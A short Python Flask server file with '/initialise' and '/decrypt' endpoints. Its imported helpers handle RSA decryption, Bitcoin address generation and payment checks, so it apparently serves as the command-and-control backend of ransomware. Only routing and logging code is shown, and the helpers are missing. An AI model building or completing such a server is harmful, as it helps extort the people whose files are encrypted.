from flask import Flask, request
from utils import (
    basic_parameter_check,
    unpack_decrypt_request,
    decrypt_rsa_data,
    bitcoin_checks,
    unpack_initialise_request,
    process_request,
)
from payment import generate_bitcoin_address
from db import insert_statistics_to_database
import logging

logging.basicConfig(format="%(asctime)s %(module)s %(levelname)s: %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)
app = Flask(__name__)


# TODO: Implement bitcoin checks
# TODO: Add proper request validation
@app.route("/initialise", methods=["POST"])
def initialise():
    request_parameters = request.get_json()
    return process_request(request_parameters, "initialise")


@app.route("/decrypt", methods=["POST"])
def decrypt():
    request_parameters = request.get_json()
    return process_request(request_parameters, "decrypt")


if __name__ == "__main__":
    app.run()

